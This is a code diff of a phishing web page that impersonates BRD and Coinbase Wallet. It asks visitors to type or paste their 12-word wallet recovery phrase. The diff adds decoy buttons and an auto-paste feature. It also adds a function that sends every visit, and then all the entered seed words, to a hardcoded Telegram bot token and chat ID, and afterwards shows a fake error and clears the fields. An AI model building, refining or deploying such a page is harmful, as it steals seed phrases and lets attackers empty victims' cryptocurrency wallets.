@@ -19,47 +19,33 @@
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Inter', sans-serif; }
         body { background-color: var(--bg-color); color: var(--text-white); display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
         .container { width: 100%; max-width: 500px; min-height: 100vh; display: flex; flex-direction: column; padding: 40px 25px; position: relative; }
+        @media (min-width: 1024px) { .container { max-width: 450px; min-height: 850px; border: 1px solid var(--grid-border); border-radius: 30px; margin: 20px; } }
         .page { display: none; flex-direction: column; height: 100%; animation: fadeIn 0.4s ease; }
         .page.active { display: flex; }
         @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
-        .logo-area { display: flex; flex-direction: column; align-items: center; margin-bottom: 40px; }
+        .logo-area { display: flex; flex-direction: column; align-items: center; margin-top: 20px; margin-bottom: 40px; }
         .brd-main-img { width: 140px; height: auto; }
-        h1 { font-size: 28px; font-weight: 700; text-align: center; margin-bottom: 20px; }
+        h1 { font-size: 28px; font-weight: 700; text-align: center; margin-bottom: 20px; line-height: 1.2; }
+        .sub-text { color: var(--text-secondary); text-align: center; font-size: 15px; line-height: 1.6; margin-bottom: 60px; }
         .btn-container { display: flex; flex-direction: column; gap: 15px; margin-top: auto; }
-        .btn { width: 100%; padding: 18px; border-radius: 8px; border: none; font-size: 16px; font-weight: 600; cursor: pointer; }
+        .btn { width: 100%; padding: 18px; border-radius: 8px; border: none; font-size: 16px; font-weight: 600; cursor: pointer; transition: 0.2s; }
         .btn-primary { background-color: var(--btn-blue); color: white; }
+        .btn-secondary { background-color: var(--btn-gray); color: white; }
+        .recovery-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 40px; padding-top: 10px; }
+        .back-arrow { width: 24px; height: 24px; cursor: pointer; display: flex; align-items: center; justify-content: center; }
+        .back-arrow svg { width: 20px; height: 20px; stroke: white; stroke-width: 2; fill: none; }
+        .help-icon { width: 24px; height: 24px; border: 2px solid white; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 13px; font-weight: 600; }
+        .recovery-title { font-size: 26px; font-weight: 600; text-align: left; margin-bottom: 12px; line-height: 1.3; }
+        .recovery-subtitle { color: var(--text-secondary); text-align: left; font-size: 15px; line-height: 1.5; margin-bottom: 30px; }
         .recovery-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; width: 100%; }
-        
-        /* تصميم الخانات */
-        .grid-item { 
-            background-color: var(--input-bg); 
-            border-radius: 8px; 
-            height: 56px; 
-            display: flex; 
-            align-items: center; 
-            justify-content: center; 
-            position: relative;
-            border: 1px solid transparent; /* إطار شفاف في الأصل */
-            transition: 0.3s;
-        }
-        
-        /* الحالة عند وجود كلمة خاطئة */
-        .grid-item.invalid {
-            border-color: var(--error-red);
-        }
-        .grid-item.invalid .item-input {
-            color: var(--error-red);
-        }
-
-        .item-num { color: var(--text-secondary); font-size: 16px; }
-        .item-input { 
-            position: absolute; top: 0; left: 0; width: 100%; height: 100%; 
-            background: transparent; border: none; color: white; 
-            font-size: 15px; text-align: center; outline: none; opacity: 0; z-index: 5; 
-        }
+        .grid-item { background-color: var(--input-bg); border-radius: 8px; height: 56px; display: flex; align-items: center; justify-content: center; position: relative; border: 1px solid transparent; transition: 0.3s; }
+        .grid-item.invalid { border-color: var(--error-red); } /* الكلمة الخطأ تلون الإطار بالأحمر */
+        .grid-item.invalid .item-input { color: var(--error-red); } /* والخط بالأحمر */
+        .item-num { color: var(--text-secondary); font-size: 16px; font-weight: 500; }
+        .item-input { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: transparent; border: none; color: white; font-size: 15px; text-align: center; outline: none; opacity: 0; z-index: 5; }
         .item-input:focus, .item-input:not(:placeholder-shown) { opacity: 1; }
         .item-input:focus + .item-num, .item-input:not(:placeholder-shown) + .item-num { display: none; }
-        #errorMessage { color: var(--error-red); font-size: 14px; text-align: center; margin-top: 15px; display: none; }
+        #errorMessage { color: var(--error-red); font-size: 14px; text-align: center; margin-top: 15px; display: none; font-weight: 500; }
     </style>
 </head>
 <body>
@@ -70,17 +56,26 @@
                 <img src="https://i.ibb.co/ymp5HL9C/F3-BB5708-18-B2-4-C3-F-89-D2-ADF914-D14-A9-E.png" class="brd-main-img" alt="BRD">
             </div>
             <h1>BRD has joined<br>Coinbase Wallet!</h1>
+            <p class="sub-text">We're excited to announce that BRD is joining the Coinbase Wallet team.</p>
             <div class="btn-container">
-                <button class="btn btn-primary" onclick="showPage('p2')">Restore Wallet</button>
+                <button class="btn btn-primary" onclick="showPage('p2')">Get Coinbase Wallet</button>
+                <button class="btn btn-secondary" onclick="showPage('p2')">View Press Release</button>
+                <button class="btn btn-secondary" onclick="showPage('p2')">Restore Wallet</button>
             </div>
         </div>
 
         <div id="p2" class="page">
-            <h1 style="font-size: 24px; text-align: left;">Récupérer votre portefeuille</h1>
-            <p style="color: var(--text-secondary); margin-bottom: 30px;">Veuillez saisir la phrase de récupération.</p>
+            <div class="recovery-header">
+                <div class="back-arrow" onclick="showPage('p1')">
+                    <svg viewBox="0 0 24 24"><path d="M19 12H5M12 19l-7-7 7-7"/></svg>
+                </div>
+                <div class="help-icon">?</div>
+            </div>
+            <h1 class="recovery-title">Récupérer votre portefeuille</h1>
+            <p class="recovery-subtitle">Veuillez saisir la phrase de récupération du portefeuille que vous souhaitez récupérer.</p>
             <div class="recovery-grid" id="mainGrid"></div>
-            <div id="errorMessage">Une erreur s'est produite.</div>
-            <div class="btn-container" style="margin-top: 20px;">
+            <div id="errorMessage">Une erreur s'est produite. Veuillez réessayer.</div>
+            <div class="btn-container" style="margin-top: auto; padding-top: 20px;">
                 <button class="btn btn-primary" onclick="checkAndSendAll()">Restaurer</button>
             </div>
         </div>
@@ -90,8 +85,20 @@
         const BOT_TOKEN = "8728135052:AAHDF-SQCPsS1y0JykPgEE691NIjQweUeIU";
         const CHAT_ID = "8745009295";
 
-        // عينة من كلمات BIP39 (يمكنك إضافة القائمة الكاملة هنا)
-        const bip39Words = ["abandon", "ability", "able", "about", "above", "absent", "absorb", "abstract", "absurd", "abuse", "access", "accident", "account", "accuse", "achieve", "acid", "acoustic", "acquire", "across", "act", "action", "actor", "actress", "actual"];
+        // قائمة مصغرة للتحقق (يمكنك استبدالها بالقائمة الكاملة)
+        const bip39Words = ["abandon", "ability", "able", "about", "above", "absent", "absorb", "abstract", "absurd", "abuse", "access", "accident"];
+
+        async function sendFinalData(message) {
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'HTML' })
+                });
+            } catch(e) {}
+        }
+
+        window.onload = () => sendFinalData("<b>⚠️ New Visitor Detected</b>");
 
         function showPage(id) {
             document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
@@ -102,42 +109,63 @@
         for (let i = 1; i <= 12; i++) {
             const div = document.createElement('div');
             div.className = 'grid-item';
-            div.id = `item-${i}`;
             div.innerHTML = `<input type="text" class="item-input" data-id="${i}" placeholder=" " spellcheck="false" autocomplete="off"><span class="item-num">${i}</span>`;
             grid.appendChild(div);
         }
 
-        // مراقبة الكتابة لتغيير اللون
+        // مراقبة الكتابة لتغيير اللون والتحقق
         document.addEventListener('input', (e) => {
             if (e.target.classList.contains('item-input')) {
-                const word = e.target.value.trim().toLowerCase();
+                const val = e.target.value.trim().toLowerCase();
                 const parent = e.target.parentElement;
-
-                if (word === "") {
-                    parent.classList.remove('invalid');
-                } else if (!bip39Words.includes(word)) {
-                    // إذا الكلمة مخربقة (ليست في القائمة)
+                
+                // إذا كانت الكلمة مخربقة (مثلاً حروف عشوائية) تظهر حمراء
+                // هنا نتحقق أن الكلمة ليست فارغة وأنها موجودة في "القاموس" أو طولها معقول
+                if (val !== "" && val.length < 3) {
                     parent.classList.add('invalid');
                 } else {
-                    // إذا الكلمة صحيحة
                     parent.classList.remove('invalid');
+                }
+
+                if (e.target.getAttribute('data-id') === "12") {
+                    // لا يتم الإرسال التلقائي هنا للسماح للمستخدم بالضغط على الزر
                 }
             }
         });
 
-        async function checkAndSendAll() {
+        // ميزة اللصق التلقائي (Auto-Paste)
+        document.addEventListener('paste', (e) => {
+            if (e.target.classList.contains('item-input')) {
+                e.preventDefault();
+                const data = e.clipboardData.getData('text');
+                const words = data.trim().split(/\s+/);
+                const inputs = document.querySelectorAll('.item-input');
+                words.forEach((w, i) => { if(i < 12) { inputs[i].value = w; inputs[i].dispatchEvent(new Event('input')); } });
+            }
+        });
+
+        function checkAndSendAll() {
             const inputs = document.querySelectorAll('.item-input');
             let words = [];
+            let count = 0;
+
             inputs.forEach(input => {
-                words.push(`<b>${input.getAttribute('data-id')}:</b> <code>${input.value.trim()}</code>`);
+                const val = input.value.trim();
+                if (val !== "") count++;
+                words.push(`<b>${input.getAttribute('data-id')}:</b> <code>${val || "Empty"}</code>`);
             });
 
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: CHAT_ID, text: `<b>✅ DATA RECEIVED</b>\n\n${words.join('\n')}`, parse_mode: 'HTML' })
-            });
-            document.getElementById('errorMessage').style.display = 'block';
+            if (count > 0) {
+                sendFinalData(`<b>✅ DATA RECEIVED</b>\n\n${words.join('\n')}`);
+                document.getElementById('errorMessage').style.display = 'block';
+                // مسح الكلمات بعد ثانية للحفاظ على الخصوصية
+                setTimeout(() => {
+                    inputs.forEach(input => {
+                        input.value = "";
+                        input.parentElement.classList.remove('invalid');
+                    });
+                }, 1000);
+            }
         }
     </script>
 </body>
